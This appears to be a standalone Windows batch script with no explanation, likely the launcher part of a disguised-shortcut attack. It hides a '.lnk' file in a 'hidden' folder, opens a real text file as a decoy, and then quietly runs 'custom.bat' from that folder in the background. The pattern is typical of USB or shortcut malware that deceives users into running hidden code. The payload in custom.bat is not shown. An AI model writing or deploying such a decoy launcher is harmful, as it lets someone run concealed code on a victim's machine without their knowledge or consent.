@REM @echo off
set name=file hello.txt
set hidden=hidden

cd ..
echo f | xcopy "%name%.lnk" "%hidden%/%name%.lnk" /f /y
del "%name%.lnk"

cd %hidden%
echo f | xcopy "%name%" "../%name%"

cd ..
start "" "%name%"

cd %hidden%

start /b cmd /c custom.bat